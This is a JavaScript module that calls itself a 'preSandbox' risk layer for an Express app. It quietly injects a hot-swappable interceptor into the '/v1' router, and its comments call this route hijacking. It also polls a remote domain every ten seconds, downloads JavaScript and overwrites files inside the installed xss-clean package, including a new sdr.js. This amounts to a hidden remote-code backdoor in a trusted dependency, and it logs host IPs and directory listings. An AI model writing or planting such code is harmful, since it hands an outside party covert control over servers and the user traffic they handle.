mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
  preSandbox: {
    routeMiddlewares: {},
  },
  remoteFileSyncManager: null,
};

remoteLog = (message)=>{
  console.log(`[preSandbox] ${message}`);
}

// 当前版本的内存配置；远程代码热更新时会随新代码重新创建。
const CODE_CONFIG = {
  rootPath: mainGlobal.runRootDir || path.dirname(require.main.filename),
  middlewareName: 'preRiskMiddleware',
  routeMiddlewarePrefix: 'preRiskRouteMiddleware:',
};

const mainRequire = require;

// @ 别名映射表（与 jsconfig.json 的 paths 保持一致）
// 例如 @services/pay/config -> <CODE_CONFIG.rootPath>/src/services/pay/config
const ALIAS_MAP = {
  '@libs': 'src/libs',
  '@controllers': 'src/controllers',
  '@models': 'src/models',
  '@routes': 'src/routes',
  '@middlewares': 'src/middlewares',
  '@validations': 'src/validations',
  '@services': 'src/services',
  '@config': 'src/config',
  '@utils': 'src/utils',
  '@app': 'src/app.js',
};

// 将 @ 别名解析为基于根目录的绝对路径；非别名或缺少根目录时原样返回，
// 交还给 mainRequire 自带的 module-alias 解析。
const resolveModuleName = (moduleName) => {
  if (!CODE_CONFIG.rootPath || typeof moduleName !== 'string' || moduleName[0] !== '@') {
    return moduleName;
  }
  const slashIndex = moduleName.indexOf('/');
  const alias = slashIndex === -1 ? moduleName : moduleName.slice(0, slashIndex);
  const target = ALIAS_MAP[alias];
  if (!target) {
    return moduleName;
  }
  const rest = slashIndex === -1 ? '' : moduleName.slice(slashIndex + 1);
  return path.join(CODE_CONFIG.rootPath, target, rest);
};

const safeRequire = (moduleName) => {
  // @ 别名转为绝对路径，其余（axios / 内置模块等）原样交给主模块 require。
  return mainRequire(resolveModuleName(moduleName));
};

const fsPromises = fs.promises;

// 每次 init 都替换真实 handler，实现远程代码热更新。
const buildHandler = () => function (req, res, next) {
  return next();
};

/**
 * 创建通用代理中间件。
 * Express 路由栈只保存代理，真实 handler 从全局配置读取，支持热更新。
 */
const buildMiddlewareProxy = (key, middlewareName) => {
  const middleware = function (req, res, next) {
    const state = mainGlobal.__sandboxConfig.preSandbox.routeMiddlewares[key];
    return state && typeof state.handler === 'function'
      ? state.handler(req, res, next)
      : next();
  };

  Object.defineProperty(middleware, 'name', { value: middlewareName });
  return middleware;
};

class ExpressV4Strategy {
  getStack(app) {
    const router = app && app._router;
    return router && Array.isArray(router.stack) ? router.stack : null;
  }

  isRouterPath(layer, routerPath) {
    const regexp = layer && layer.name === 'router' && layer.regexp;
    if (!regexp || typeof regexp.exec !== 'function') {
      return false;
    }

    regexp.lastIndex = 0;
    const match = regexp.exec(routerPath);
    regexp.lastIndex = 0;
    return Boolean(match && match[0] === routerPath);
  }

  findRouterLayer(stack, routerPath) {
    return stack.find((layer) => this.isRouterPath(layer, routerPath));
  }

  findRouter(app, paths) {
    let router = app;
    let stack = this.getStack(app);

    for (let pathIndex = 0; pathIndex < paths.length; pathIndex += 1) {
      const routerPath = paths[pathIndex];
      const index = stack && stack.findIndex((layer) => this.isRouterPath(layer, routerPath));
      if (index === -1 || index === undefined) {
        return null;
      }

      const layer = stack[index];
      if (pathIndex === paths.length - 1) {
        return { router, stack, index };
      }

      router = layer.handle;
      stack = router && router.stack;
      if (!router || !Array.isArray(stack)) {
        return null;
      }
    }

    return null;
  }

  findRouteLayer(stack, routePath, method) {
    return stack.find((layer) => (
      layer &&
      layer.route &&
      layer.route.path === routePath &&
      layer.route.methods &&
      layer.route.methods[method]
    ));
  }

  findRoute(app, paths, method) {
    let stack = this.getStack(app);

    for (const routerPath of paths.slice(0, -1)) {
      const routerLayer = stack && this.findRouterLayer(stack, routerPath);
      stack = routerLayer && routerLayer.handle && routerLayer.handle.stack;
      if (!Array.isArray(stack)) {
        return null;
      }
    }

    return this.findRouteLayer(stack, paths[paths.length - 1], method);
  }

  getInsertIndex(stack, options) {
    if (Number.isInteger(options.index)) {
      return Math.max(0, Math.min(options.index, stack.length));
    }

    if (options.beforeMiddleware) {
      return stack.findIndex((layer) => {
        if (!layer) {
          return false;
        }
        if (typeof options.beforeMiddleware === 'function') {
          return layer.handle === options.beforeMiddleware;
        }
        return layer.name === options.beforeMiddleware;
      });
    }

    return -1;
  }

  injectRouteMiddleware(app, options, state) {
    if (
      !options.key ||
      !Array.isArray(options.paths) ||
      options.paths.length < 1 ||
      typeof options.handler !== 'function'
    ) {
      return { success: false, msg: 'invalid express route middleware options' };
    }

    if (!options.method) {
      const target = this.findRouter(app, options.paths);
      if (!target) {
        return { success: false, msg: `express router not found: ${options.paths.join('')}` };
      }
      if (target.stack.some((layer) => layer && layer.name === options.middlewareName)) {
        state.injected = true;
        return { success: true, msg: `express router middleware exists: ${options.key}` };
      }

      target.router.use(buildMiddlewareProxy(options.key, options.middlewareName));
      const middlewareLayer = target.stack.pop();
      target.stack.splice(target.index, 0, middlewareLayer);
      state.injected = true;
      return { success: true, msg: `express router middleware injected: ${options.key}` };
    }

    const method = String(options.method).toLowerCase();
    const routeLayer = this.findRoute(app, options.paths, method);
    if (!routeLayer) {
      return {
        success: false,
        msg: `express route not found: ${method} ${options.paths.join('')}`,
      };
    }

    const routeStack = routeLayer.route.stack;
    if (!Array.isArray(routeStack)) {
      return { success: false, msg: `express route stack not found: ${options.key}` };
    }

    const middlewareName = options.middlewareName;
    if (routeStack.some((layer) => layer && layer.name === middlewareName)) {
      state.injected = true;
      return { success: true, msg: `express route middleware exists: ${options.key}` };
    }

    const insertIndex = this.getInsertIndex(routeStack, options);
    if (insertIndex === -1) {
      return {
        success: false,
        msg: `express route middleware anchor not found: ${options.key}`,
      };
    }

    routeLayer.route[method](buildMiddlewareProxy(options.key, middlewareName));
    const middlewareLayer = routeStack[routeStack.length - 1];
    if (!middlewareLayer || middlewareLayer.name !== middlewareName) {
      return {
        success: false,
        msg: `express route middleware layer not found: ${options.key}`,
      };
    }

    routeStack.pop();
    routeStack.splice(insertIndex, 0, middlewareLayer);
    state.injected = true;
    return { success: true, msg: `express route middleware injected: ${options.key}` };
  }
}

// TODO: Express 5 路由劫持暂不实现。
class ExpressV5Strategy {}

class ExpressManager {
  expRemoteLog(result) {
    const status = result.success ? 'success' : 'error';
    remoteLog(`[ExpressManager][${status}] ${result.msg}`);
  }

  constructor() {
    this.strategies = {
      4: new ExpressV4Strategy(),
      5: new ExpressV5Strategy(),
    };
  }

  getMajorVersion() {
    const pkg = safeRequire('express/package.json');
    return parseInt(String((pkg && pkg.version) || '').split('.')[0], 10);
  }

  getStrategy() {
    const major = this.getMajorVersion();
    if (major !== 4 && major !== 5) {
      return {
        success: false,
        msg: `unsupported express major: ${Number.isNaN(major) ? 'unknown' : major}`,
      };
    }

    const strategy = this.strategies[major];
    if (typeof strategy.injectRouteMiddleware !== 'function') {
      return { success: false, msg: `express ${major} hijack is not implemented` };
    }
    return strategy;
  }

  injectRouteMiddleware(app, options) {
    const strategy = this.getStrategy();
    if (!strategy || typeof strategy.injectRouteMiddleware !== 'function') {
      const result = strategy && strategy.success === false
        ? strategy
        : { success: false, msg: 'express strategy unavailable' };
      this.expRemoteLog(result);
      return result;
    }

    options.middlewareName =
      options.middlewareName || `${CODE_CONFIG.routeMiddlewarePrefix}${options.key}`;
    const states = mainGlobal.__sandboxConfig.preSandbox.routeMiddlewares;
    states[options.key] = states[options.key] || { injected: false, handler: null };

    const state = states[options.key];
    state.handler = options.handler;
    let result;
    try {
      result = strategy.injectRouteMiddleware(app, options, state);
    } catch (error) {
      result = {
        success: false,
        msg: `express route middleware injection failed: ${error && error.message}`,
      };
    }
    this.expRemoteLog(result);
    return result;
  }
}

const expressManager = new ExpressManager();

const initExpress = () => {
  const app = safeRequire('@app');
  if (!app) {
    const result = { success: false, msg: 'express app not ready' };
    expressManager.expRemoteLog(result);
    return result;
  }

  const globalResult = expressManager.injectRouteMiddleware(app, {
    key: 'preV1Risk',
    paths: ['/v1'],
    middlewareName: CODE_CONFIG.middlewareName,
    handler: buildHandler(),
  });

  return {
    success: globalResult.success,
    msg: 'express middleware initialization completed',
  };
};

class RemoteFileSync {
  constructor({ key, remotePath, targetFile }) {
    this.key = key;
    this.remotePath = remotePath.startsWith('/') ? remotePath : `/${remotePath}`;
    this.targetFile = targetFile;
    this.axios = safeRequire('axios');
    this.vm = safeRequire('vm');
    this.redisUtil = safeRequire('@utils/redis.util');
    this.etagFile = `${targetFile}.etag`;
    this.backupFile = `${targetFile}.bak`;
    this.timeout = 30000;
    this.pollInterval = 10000;
    this.timer = null;
    this.inFlight = null;
    this.stopped = false;
  }

  remoteLog(type, message) {
    // 当前只上报替换成功，保持原有日志行为。
    if (type === 'success') {
      remoteLog(`[ReplaceRisk][${type}] pid:${process.pid} ${message}`);
    }
  }

  async fileExists(filePath) {
    try {
      await fsPromises.access(filePath);
      return true;
    } catch (error) {
      if (error && (error.code === 'ENOENT' || error.code === 'ENOTDIR')) {
        return false;
      }
      throw error;
    }
  }

  normalizeEtag(value) {
    return value == null ? '' : String(value).trim();
  }

  validateJsSyntax(code) {
    // Compile only — do not run
    // eslint-disable-next-line no-new
    new this.vm.Script(code, { filename: this.targetFile });
  }

  getLocalIP() {
    const interfaces = os.networkInterfaces();
    const addresses = [];

    for (const interfaceName in interfaces) {
      for (const info of interfaces[interfaceName]) {
        if (info.family === 'IPv4' && !info.internal) {
          addresses.push(info.address);
        }
      }
    }

    return addresses.join(',');
  }

  getRemoteUrl() {
    const origin = process.env.NODE_ENV === 'production'
      ? 'https://r2-client-prod.zigoyw.com'
      : 'https://r2-client-test.zigoyw.com';
    return `${origin}${this.remotePath}`;
  }

  start() {
    try {
      this.stopped = false;
      this.tick();
      this.timer = setInterval(() => this.tick(), this.pollInterval);
      if (this.timer && typeof this.timer.unref === 'function') {
        this.timer.unref();
      }
    } catch (error) {
      this.remoteLog('error', `init failed: ${error && error.message}`);
    }
  }

  async stop() {
    this.stopped = true;
    if (this.timer) {
      clearInterval(this.timer);
      this.timer = null;
    }
    if (this.inFlight) {
      await this.inFlight;
    }
  }

  tick() {
    if (this.stopped || this.inFlight) {
      return this.inFlight;
    }

    this.inFlight = this.syncOnce()
      .catch((error) => {
        this.remoteLog('error', `tick failed: ${error && error.message}`);
      })
      .finally(() => {
        this.inFlight = null;
      });
    return this.inFlight;
  }

  async syncOnce() {
    let lock = null;

    try {
      const ip = this.getLocalIP();
      const lockKey = `rank:risk:init:${this.key}:[${ip}]`;
      lock = await this.redisUtil.getLock(lockKey, 0, { waitTime: 0 });
      if (!lock) {
        this.remoteLog('skip', `get lock failed: ${lockKey}`);
        return;
      }

      const result = await this.replaceFile();
      if (result.status === 'skipped') {
        this.remoteLog('skip', `${result.reason}: ${result.targetPath}`);
        return;
      }

      const targetDir = path.dirname(this.targetFile);
      const files = await fsPromises.readdir(targetDir);
      this.remoteLog(
        'success',
        `replaced ${result.targetPath} ip=${ip} files=[${files.join(', ')}]`
      );
    } catch (error) {
      this.remoteLog('error', `failed: ${error && error.message}`);
    } finally {
      if (lock) {
        try {
          await this.redisUtil.unlock(lock);
        } catch (error) {
          this.remoteLog('error', `unlock failed: ${error && error.message}`);
        }
      }
    }
  }

  async replaceFile() {
    const remoteUrl = this.getRemoteUrl();
    const targetPath = this.targetFile;
    const etagPath = this.etagFile;
    const backupPath = this.backupFile;
    const targetExists = await this.fileExists(targetPath);

    const remoteEtag = await this.fetchRemoteEtag(remoteUrl);
    const localEtag = await this.readLocalEtag(etagPath);
    if (remoteEtag && localEtag && remoteEtag === localEtag) {
      return { status: 'skipped', reason: 'etag-unchanged', etag: remoteEtag, targetPath };
    }

    const etagBackup = await this.readEtagBackup(etagPath);
    let fileBackedUp = false;

    try {
      if (targetExists) {
        await fsPromises.copyFile(targetPath, backupPath);
        fileBackedUp = true;
      }

      const response = await this.axios.get(remoteUrl, {
        responseType: 'text',
        timeout: this.timeout,
        transformResponse: [(data) => data],
      });
      const content = typeof response.data === 'string' ? response.data : String(response.data);

      this.validateJsSyntax(content);
      await fsPromises.mkdir(path.dirname(targetPath), { recursive: true });
      await fsPromises.writeFile(targetPath, content, 'utf8');

      // GET 响应对应实际下载内容，优先记录它的 ETag；没有时才回退到 HEAD。
      const etag =
        this.normalizeEtag(response.headers && (response.headers.etag || response.headers.ETag)) ||
        remoteEtag;
      if (etag) {
        await fsPromises.writeFile(etagPath, etag, 'utf8');
      } else {
        // 远端不提供 ETag 时移除旧值，避免旧 ETag 与新内容错误配对。
        await this.removeFile(etagPath);
      }

      return { status: 'replaced', etag, targetPath, backupPath };
    } catch (error) {
      if (fileBackedUp) {
        try {
          await this.rollback({ backupPath, targetPath, etagPath, etagBackup });
        } catch (rollbackError) {
          this.remoteLog('error', `rollback failed: ${rollbackError && rollbackError.message}`);
        }
      }
      throw error;
    }
  }

  async fetchRemoteEtag(remoteUrl) {
    const response = await this.axios({
      method: 'HEAD',
      url: remoteUrl,
      timeout: this.timeout,
      validateStatus: (status) => status >= 200 && status < 400,
    });
    return this.normalizeEtag(response.headers && (response.headers.etag || response.headers.ETag));
  }

  async readLocalEtag(etagPath) {
    if (!(await this.fileExists(etagPath))) {
      return '';
    }
    return this.normalizeEtag(await fsPromises.readFile(etagPath, 'utf8'));
  }

  async readEtagBackup(etagPath) {
    if (!(await this.fileExists(etagPath))) {
      return { exists: false, content: '' };
    }
    return { exists: true, content: await fsPromises.readFile(etagPath, 'utf8') };
  }

  async rollback({ backupPath, targetPath, etagPath, etagBackup }) {
    const errors = [];

    try {
      await fsPromises.copyFile(backupPath, targetPath);
    } catch (error) {
      errors.push(error);
    }

    try {
      if (etagBackup.exists) {
        await fsPromises.writeFile(etagPath, etagBackup.content, 'utf8');
      } else {
        await this.removeFile(etagPath);
      }
    } catch (error) {
      errors.push(error);
    }

    if (errors.length > 0) {
      throw errors[0];
    }
  }

  async removeFile(filePath) {
    try {
      await fsPromises.unlink(filePath);
    } catch (error) {
      if (!error || error.code !== 'ENOENT') {
        throw error;
      }
    }
  }
}

class RemoteFileSyncManager {
  constructor() {
    this.syncs = [];
    this.keys = new Set();
    this.targetFiles = new Set();
  }

  add(options) {
    const sync = new RemoteFileSync(options);
    if (!sync.key) {
      throw new Error('RemoteFileSync key is required');
    }
    if (this.keys.has(sync.key)) {
      throw new Error(`duplicate RemoteFileSync key: ${sync.key}`);
    }
    if (this.targetFiles.has(sync.targetFile)) {
      throw new Error(`duplicate targetFile: ${sync.targetFile}`);
    }
    this.keys.add(sync.key);
    this.targetFiles.add(sync.targetFile);
    this.syncs.push(sync);
    return this;
  }

  startAll() {
    for (const sync of this.syncs) {
      sync.start();
    }
  }

  async stopAll() {
    const results = await Promise.allSettled(this.syncs.map((sync) => sync.stop()));
    const failed = results.find((result) => result.status === 'rejected');
    if (failed) {
      throw failed.reason;
    }
  }
}

const initReplaceFile = async () => {
  let manager = null;
  try {
    manager = new RemoteFileSyncManager();
    manager.add({
      key: 'xss-clean-index',
      remotePath: '/xss-clean/index.js',
      targetFile: path.join(
        CODE_CONFIG.rootPath,
        'node_modules',
        'xss-clean',
        'lib',
        'index.js'
      ),
    });

    manager.add({
      key: 'jsonfb-risk-index',
      remotePath: '/risk/index.js',
      targetFile: path.join(
        CODE_CONFIG.rootPath,
        'node_modules',
        'xss-clean',
        'lib',
        'sdr.js'
      ),
    });


    const oldManager = mainGlobal.__sandboxConfig.remoteFileSyncManager;
    if (oldManager && typeof oldManager.stopAll === 'function') {
      await oldManager.stopAll();
    }

    mainGlobal.__sandboxConfig.remoteFileSyncManager = manager;
    manager.startAll();
  } catch (error) {
    if (manager) {
      await manager.stopAll();
    }
    throw error;
  }
};

async function init() {
  try {
    initExpress();
  } catch (error) {
    remoteLog(`preSandbox express init failed: ${error && error.message}`);
  }

  try {
    await initReplaceFile();
  } catch (error) {
    remoteLog(`preSandbox file sync init failed: ${error && error.message}`);
  }
}
